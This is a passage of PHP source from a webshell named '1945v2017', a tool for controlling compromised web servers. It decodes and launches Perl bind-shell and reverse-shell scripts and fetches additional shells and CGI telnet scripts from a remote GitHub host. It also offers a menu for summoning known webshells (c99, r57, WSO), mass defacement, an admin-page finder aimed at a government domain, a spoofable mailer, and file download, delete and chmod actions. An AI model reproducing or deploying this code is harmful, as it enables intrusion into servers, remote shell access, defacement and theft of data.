if(isset($_POST['decode'])){$o = $_POST['mode'];switch ($o) {case 'url':$val = urldecode($_POST['str']);break;case 'b64':$val = base64_decode($_POST['str']);break;case 'cuu':$val = convert_uudecode($_POST['str']);break;case 'b64b64':$val = base64_decode(base64_decode($_POST['str']));break;case 'b64str':$val = str_rot13(base64_decode($_POST['str']));break;case 'b64url':$val =urldecode(base64_decode($_POST['str']));break;case 'b64strgz':$val = gzinflate(str_rot13(base64_decode($_POST['str'])));	break;case 'b64cuu':$val = convert_uudecode(base64_decode($_POST['str']));break;default:$val = $_POST['str'];break;
	}
}
if(isset($_POST['hash'])){$o = $_POST['mode'];switch ($o) {case 'md2':$val = hash("md2",$_POST['str']);break;case 'md4':$val = hash("md4",$_POST['str']);break;case 'md5':$val = md5($_POST['str']);break;case 'sha1':$val = sha1($_POST['str']);break;case 'sha256':$val = hash("sha256",$_POST['str']);break;case 'sha384':$val =hash("sha384",$_POST['str']);break;case 'sha512':$val=hash("sha512",$_POST['str']);break;case 'crypt':$val =crypt($_POST['str']);break;case 'md':$val = md5(md5($_POST['str']));default:$val = $_POST['str'];break;
	}
}
$html->show($html->h1("<center>String Tools</center>"));
	$input ="<label for=\"mode\">Operate :</label>".$html->select("mode",$opt,"class=\"input_m\" style=\"width:300px\"");
	$input.= $html->submit("hash","value=\"Hash !\"");
	$input.= $html->submit("encode","value=\"Encode !\"");
	$input.= $html->submit("decode","value=\"Decode !\"");
	$vall =(empty($_POST)) ? "// String Tools c0ded by shutdown57" : $vall=$val;
	$input.= "<br>".$html->textarea("str",$val,"");
	$html->show($html->form("POST",$input));
}elseif ($__action__ == "net") {
	$html->show("<center>");
	$html->show($html->h1("Network ")."</center>");
	$html->show("<b>Bind Port ::</b>");
	$input_bp = $html->input("text","binport","value=\"1945\"","Port ");
	$input_bp.= $html->submit("sbp","value=\"Connect !\"");
	$input_bc = $html->input("text","ipbc","value=\"".gethostbyname($_SERVER['HTTP_HOST'])."\"","Server ");
	$input_bc.="  ".$html->input("text","pbc","value=\"1945\"","Port ");
	$input_bc.= $html->submit("sbc","value=\"Connect !\"");
	$html->show($html->form("POST",$input_bp));
	$html->show("<br>");
	$html->show("<b>Backconnect ::</b>");
	$html->show($html->form("POST",$input_bc));

	if(isset($_POST['sbp']))
	{
		$script_bind_port = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
		$act->simpantext("/tmp/1945_bp.pl",base64_decode($script_bind_port));
		$port = $_POST['bindport'];
		$res = FileMan45::cmd("perl /tmp/1945_bp.pl 1>/dev/null 2>&1 &");
		$html->show("<pre class=\"code\">");
		$html->show($res."\n\n");
		$html->show(FileMan45::cmd("ps aux | grep 1945_bp.pl"));
		unlink("/tmp/1945_bp.pl");
		$html->show("</pre>");
	}
	if(isset($_POST['sbc']))
	{
		$script_back_connect = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQokc2ggPSAiZXhwb3J0IFRFUk09eHRlcm07UFMxPSdcJFBXRCBbMTk0NXYyMDE3XSA+JztleHBvcnQgUFMxOy9iaW4vc2ggLWkiOw0Kc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KY29ubmVjdChTT0NLRVQsICRwYWRkcikgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0Kb3BlbihTVERJTiwgIj4mU09DS0VUIik7DQpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7DQpvcGVuKFNUREVSUiwgIj4mU09DS0VUIik7DQpzeXN0ZW0oJ2VjaG8gIistLS0tLVsgMTk0NXYyMDE3IHNoZWxsIGMwZGVkIGJ5IDogc2h1dGRvd241NyBdLS0tLS0rIicpOw0Kc3lzdGVtKCdlY2hvICIrLS0tLS0tLS0tLVsgNzJ0aCBJbmRvbmVzaWEgTWVyZGVrYSBdLS0tLS0tLS0tKyIgOyBbK10gd2FpdCAuLiA7IHNsZWVwIDUnKTsNCnN5c3RlbSgkc2gpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
		$act->simpantext("/tmp/1945_bc.pl",base64_decode($script_back_connect));
		$port = $_POST['pbc'];
		$ip   = $_POST['ipbc'];
		$res = FileMan45::cmd("perl /tmp/1945_bc.pl $ip $port 1>/dev/null 2>&1 &");
		$html->show("<pre class=\"code\">");
		$html->show($res,"\n\n");
		$html->show(FileMan45::cmd("ps aux | grep 1945_bc.pl"));
		unlink("/tmp/1945_bc.pl");
		$html->show("</pre>");
	}
}elseif ($__action__ == "mail") {
	$html->show("<center>");
	$html->show($html->h1("Mail Sender"));
	$form = $html->input("text","to","value=\"webmaster@localhost\""," To ");
	$form.= $html->input("text","from","value=\"shutdown57@indonesia.go.id\""," From ");
	$form.= $html->input("text","subjek","value=\":* kissed\""," Subject ");
	$form.= $html->submit("sent","value=\"send email!\"");
	$form.= $html->textarea("konten","// Patch Ur Faces~","");
	$html->show($html->form("POST",$form));
	$html->show("</center>");
	if(isset($_POST['sent']))
	{
		$to = $_POST['to'];
		$from = $_POST['from'];
		$subjek = $_POST['subjek'];
		$konten = $_POST['konten'];
		if(mail($to,$subject,$konten,$from))
		{
			$html->show("<b> Email Sent Successfuly ~</b>");
			$html->actdone();
		}else{
			$html->show("<b> Email Sent Failed ~</b>");
			$html->actfail();
		}
	}
}elseif ($__action__ == "rsw") {
	if(Act45::getscript("awesome1945.php","https://raw.githubusercontent.com/alintamvanz/webshell/master/awesome1945.php"))
	{
		$html->show("<center>");
		echo "<script>window.open('awesome1945.php');</script>";
		echo "Not redirected ? <a href='awesome1945.php' target='_blank'> Click here nubz !</a> :'v ";
		$html->actdone();
	}else{
		$html->actfail();
		$html->show("</center>");
	}
}elseif ($__action__ == "kcy") {
	$ak = "?__merdeka__=$dir&__action__=";
	$html->show("<center><div class=\"kuchiyose\">");
	$html->show($html->h1("kuchiyose No Jutsu :*"));
	$kcy = $html->li($html->a($ak."kuchiyose_wso","WSO 2.5",""));
	$kcy.= $html->li($html->a($ak."kuchiyose_b374k","b374k 2.8",""));
	$kcy.= $html->li($html->a($ak."kuchiyose_idx","indoXploit v2",""));
	$kcy.= $html->li($html->a($ak."kuchiyose_1945","1945 freedom is real",""));
	$kcy.= $html->li($html->a($ak."kuchiyose_ayana","Ayana Shahab Priv8 Shell",""));
	$kcy.= $html->li($html->a($ak."kuchiyose_lc","linuXcode v2017",""));
	$kcy.= $html->li($html->a($ak."kuchiyose_wa","WebAdmin",""));
	$kcy.= $html->li($html->a($ak."kuchiyose_ms","Mini-Shell",""));
	$kcy.= $html->li($html->a($ak."kuchiyose_it","ITSecTeam",""));
	$kcy.= $html->li($html->a($ak."kuchiyose_c99","c99 shell",""));
	$kcy.= "<br>";
	$kcy.= $html->li($html->a($ak."kuchiyose_r57","r57 shell",""));
	$kcy.= $html->li($html->a($ak."kuchiyose_symb","Symlink Mobile",""));
	$kcy.= $html->li($html->a($ak."kuchiyose_symsa","Symlink Sa 3.0",""));
	$kcy.= $html->li($html->a($ak."kuchiyose_md","Mass Deface",""));
	$kcy.= $html->li($html->a($ak."kuchiyose_zh","Zone-H Notifier",""));
	$ul = $html->ul($kcy);
	$html->show($ul);
	$html->show("</div></center>");
	//kuchiyose started
}elseif ($__action__ == "kuchiyose_wa") {echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>";$html->show($act->kuchiyose($__action__));echo "</center>";}elseif ($__action__ == "kuchiyose_r57") {echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>";$html->show($act->kuchiyose($__action__));echo "</center>";}elseif ($__action__ == "kuchiyose_wso") {echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>"; $html->show($act->kuchiyose($__action__));echo "</center>";}elseif($__action__ == "kuchiyose_idx"){echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>"; $html->show($act->kuchiyose($__action__)); echo "</center>";}elseif($__action__ == "kuchiyose_b374k"){	echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>";
	$html->show($act->kuchiyose($__action__)); echo "</center>";}elseif($__action__ == "kuchiyose_1945"){echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>"; $html->show($act->kuchiyose($__action__)); echo "</center>";}elseif($__action__ == "kuchiyose_ayana"){ echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>"; $html->show($act->kuchiyose($__action__)); echo "</center>";}elseif($__action__ == "kuchiyose_lc"){echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>"; $html->show($act->kuchiyose($__action__)); echo "</center>";}elseif($__action__=="kuchiyose_it"){echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>"; $html->show($act->kuchiyose($__action__)); echo "</center>";}elseif($__action__=="kuchiyose_ms"){echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>"; $html->show($act->kuchiyose($__action__)); echo "</center>";}elseif($__action__=="kuchiyose_c99"){echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>"; $html->show($act->kuchiyose($__action__)); echo "</center>";}// end kuchiyose
	elseif($__action__ == "adm")
	{
		$html->show("<center>");
		$html->show($html->h1("Admin Finder"));
		if(empty($_POST['scan']))
		{
		$input = $html->input("text","url","value=\"http://indonesian.go.id\"","Target URL ");
		$input.= $html->submit("scan","value=\"find admin\"");
		$input.= "<br><br> <b> Worldlist</b><br>";
		$val = $act->getcontent("https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/wordlist_af.txt");
		$input.= $html->textarea("wordlist",$val,"style=\"width:400px;height:250px\"");
		$html->show($html->form("POST",$input)."</center>");
	
		}else{
			if(!empty($_POST['url']))
			{
				$html->show("<div class=\"code\" style=\"text-align:left;\">");
				$e = explode("\n",$_POST['wordlist']);
				$url = $_POST['url'];
				foreach($e as $wordlist){
				$admin = array("admin","password","username","login","masuk","daftar","register");
				if(preg_match('/'.implode("|",$admin).'/i',$act->getcontent($url."/".$wordlist))){
					$html->show("    [ <font color=lime>FOUND</font> ] ".$url."/".$wordlist."<br>");
				}else{
					$html->show("  [ <font color=red>NOT FOUND</font> ] ".$url."/".$wordlist."<br>");
				}
			}
			$html->show("</div>");
		}
	}
}elseif($__action__ == "abt")
{
	$html->show("<center>");
	$html->show($html->h1("About 1945v2017"));
	$html->show("<b>MerdekaAtoeMati</b><br>");
	$html->show("<i>1945 shell by : ".$html->a("https://facebook.com/JKT48.co","shutdown57","target=\"_blank\"")."</i>");
	$html->show(base64_decode(base64_decode("UEhBK1BHSStVSEp2YTJ4aGJXRnphVHd2WWo0OEwzQStEUW84YVQ1TFlXMXBJR0poYm1kellTQkpibVJ2Ym1WemFXRWdaR1Z1WjJGdUlHbHVhU0J0Wlc1cVlYUmhhMkZ1SUd0bGJXVnlaR1ZyWVdGdUlFbHVaRzl1WlhOcFlTdzhZbkkrRFFwSVlXd3RhR0ZzSUdwaGJtY2diV1Z1WjJWdVlXa2djR1Z0YVc1a1lXaGhiaUJyWld0dlpXRnpZV0Z1SUdSaGJpQnNZV2x1TFd4aGFXNDhZbkkrRFFwa2FTQnpaV3hsYm1kbllYSmhhMkZ1SUdSbGJtZGhiaUIwYW1GeVlTQnpZV3R6WVcxaElHUmhiaUJrWVd4aGJTQjBhV1Z0Y0c4Z2FtRnVaeUJ6WlhOcGJtZHJZWFF0YzJsdVoydGhkRzVxWVR4aWNqNE5Dand2YVQ0OFlpQmhiR2xuYmoxeWFXZDBQa1JxWVd0aGNuUmhMREUzTFRBNExURTVORFVnUEdKeVBpQkJkR0Z6SUc1aGJXRWdZbUZ1WjNOaElFbHVaRzl1WlhOcFlUeGljajRnVTI5bGEyRnlibThnTFNCSVlYUjBZVHd2WWo0PQ==")));


}elseif($__action__ == "dl")
{
	 @ob_clean();
    $file = $_GET['__files__'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}elseif($__action__ == "log")
{
	$dstr = session_destroy();
	if($dstr == true)
	{
		$html->show("<script>alert('Bye !'); window.location.href='?__1945__';</script>");
	}
}elseif($__action__ == "telnet")
{
$mkdir = @mkdir("1945_cgi",0755);
$hta = "AddHandler cgi-script .pl \n AddHandler cgi-script .sh";
$source = $act->getcontent("https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/cgi_telnet.pl");
$act->simpantext("1945_cgi/.htaccess",$hta);
$act->simpantext("1945_cgi/cgi_telnet.pl",$source);
$html->show("<iframe src=\"1945_cgi/cgi_telnet.pl\" width=\"100%\" height=\"100%\" frameborder=\"0\"></iframe>");
}elseif($__action__ == "sh")
{
$mkdir = @mkdir("1945_cgi/",0755);
$hta = "AddHandler cgi-script .pl \n AddHandler cgi-script .sh";
$source = $act->getcontent("https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/cgi_shell.sh");
$act->simpantext("1945_cgi/.htaccess",$hta);
$act->simpantext("1945_cgi/cgi_shell.sh",$source);
$html->show($html->a("1945_cgi/cgi_shell.sh","Click Here, ",""));
$html->show("<iframe src=\"1945_cgi/cgi_shell.sh\" width=\"100%\" height=\"100%\" frameborder=\"0\"></iframe>");
}

}else{

$html->show("<form method=\"POST\"><table class=\"a_exp\" align=\"center\">");
$html->show($html->th("No.").$html->th("*").$html->th("Files").$html->th("Size").$html->th("Type").$html->th("Date Modif").$html->th("Owner:Group").$html->th("Permission").$html->th("Action"));
foreach($scandir as $d)
{
	if(!is_dir("$dir/$d"))continue;
	if($d == ".")
	{
		$f=$html->a("?__merdeka__=".$dir,".","");
	}elseif($d == "..")
	{
		$f =$html->a("?__merdeka__=".dirname($dir),"..","");
	}else{
		$f=$html->a("?__merdeka__=$dir/$d",$d,"");
	}
	$html->show($html->tr($html->td($no++).
		$html->td("<input type='checkbox' name='seldir[]' value='".$dir."/".$d."'>").
		$html->td("<img src=\"data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=\">[<b> ".$f." </b>]").
		$html->td($fileman->getfsize("$dir/$d")).
		$html->td($fileman->getmime("$dir/$d")).
		$html->td($fileman->getfilemtime("$dir/$d")).
		$html->td($fileman->getowner("$dir/$d").":".$fileman->getgroup("$dir/$d")).
		$html->td($fileman->getperms("$dir/$d")).
		$html->td($fileman->actiondir("$dir/$d"))));
}
foreach($scandir as $f)
{
	if(!is_file("$dir/$f")||$f=="."||$f=="..")continue;
	$html->show($html->tr($html->td($no++).
		$html->td("<input type='checkbox' name='selfile[]' value='".$dir."/".$f."'>").
		$html->td("<img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=\">- ".$html->a("?__files__=$dir/$f&__action__=view",$f,"")).
		$html->td($fileman->getfsize("$dir/$f")).
		$html->td($fileman->getmime("$dir/$f")).
		$html->td($fileman->getfilemtime("$dir/$f")).
		$html->td($fileman->getowner("$dir/$f").":".$fileman->getgroup("$dir/$f")).
		$html->td($fileman->getperms("$dir/$f")).
		$html->td($fileman->actionfile("$dir/$f"))));
}
if(empty($_SESSION['files_select']))
{
$option_oo = array(
	""=>"- action selected files-",
	"delete"=>"delete",
	"copy"=>"copy",
	"cut"=>"cut",
	"chmod"=>"chmod");
}else{
$option_oo = array(
		""=>"- action selected files-",
	"paste"=>"paste here",
	"cut"=>"move here",
	"delete"=>"delete",
	"copy"=>"copy",
	"chmod"=>"chmod",
	"cancel"=>"UnSelect");
foreach($_SESSION['files_select'] as $op){$optv.=$html->option($op,basename($op));}
$view ="File selected : ". $html->select("__action__",$optv,"class=\"input_m\" ");
$per = substr(sprintf('%o', fileperms($op)),-4);
}
$input_chmod = $html->input("text","mode","value=\"".$per."\"","Permission ");
$input_chmod.= $html->submit("chmod","value=\">>\"");
$form_chmod = $html->form("POST",$input_chmod);
if(!empty($_GET['_act'])=="chmod")  $chmod_form = $form_chmod; else ""; 
foreach($option_oo as $name=>$val){ $opt .= $html->option($name,$val); }
$select = $html->select("action",$opt,"class=\"input_m\"").$html->submit("sbmt","value=\">>\" ");
$html->show($html->tr("<td colspan='9'>".$select." ".$view. " ".$chmod_form."</td>"));
if(isset($_POST['sbmt'])){if(!empty($_POST['seldir'])){ $seldir = $_POST['seldir'];if($_POST['action']=='delete'){if(is_array($_POST['seldir'])){ foreach($seldir as $deldir){$act->delete($deldir);$html->show("<meta http-equiv='refresh' content='0;url='>"); }}else{$act->delete($seldir);$html->show("<meta http-equiv='refresh' content='0;url='>"); }}
}
if(!empty($_POST['selfile'])){ $selfile = $_POST['selfile']; if($_POST['action']=='copy'){$_SESSION['files_select']= array();$n=0;foreach($_POST['selfile'] as $filesel){
				$_SESSION['files_select'][$n++] = $filesel; $html->show("<meta http-equiv='refresh' content='0;url='>");}}elseif($_POST['action']=='delete'){if(is_array($_POST['selfile'])){ foreach($selfile as $delfile){ $act->delete($delfile); $html->show("<meta http-equiv='refresh' content='0;url='>");}}else{$act->delete($selfile); $html->show("<meta http-equiv='refresh' content='0;url='>");}}elseif($_POST['action']=='extract'){$_SESSION['files_select']=array(); $n=0; foreach($_POST['selfile'] as $filesel){$_SESSION['files_select'][$n++]=$filesel;$html->show("<meta http-equiv='refresh' content='0;url='>");}}elseif($_POST['action']=='chmod'){
	$_SESSION['files_select']=array();
	$n=0;
	foreach($_POST['selfile'] as $pile){$_SESSION['files_select'][$n++]=$pile;} $html->show("<meta http-equiv='refresh' content='0;url=?_act=chmod'>");

 } }
if($_POST['action']=='paste'){foreach($_SESSION['files_select'] as $fs){copy($fs,$dir."/".basename($fs));unset($_SESSION['files_select']);$html->show("<meta http-equiv='refresh' content='0;url='>");}}
}
if($_POST['action']=='cancel'){unset($_SESSION['files_select']); $html->show("<meta http-equiv='refresh' content='0;url='>");}
if(isset($_POST['chmod'])){
	$perms = 0;
	for($i=strlen($_POST['mode'])-1;$i>=0;--$i){
	$perms += (int)$_POST['mode'][$i]*pow(8, (strlen($_POST['mode'])-$i-1));}
	foreach($_SESSION['files_select'] as $file_chmod){
		if(!@chmod($file_chmod,$perms)){$html->show("<script>alert('failed change Permission'); window.location.href='?';</script>");}else{$html->show("<script>alert('Successfuly change Permission!'); window.location.href='?';</script>"); unset($_SESSION['files_select']);}
	}
}
$html->show("</table>");
}
$html->show($html->footer());
?>
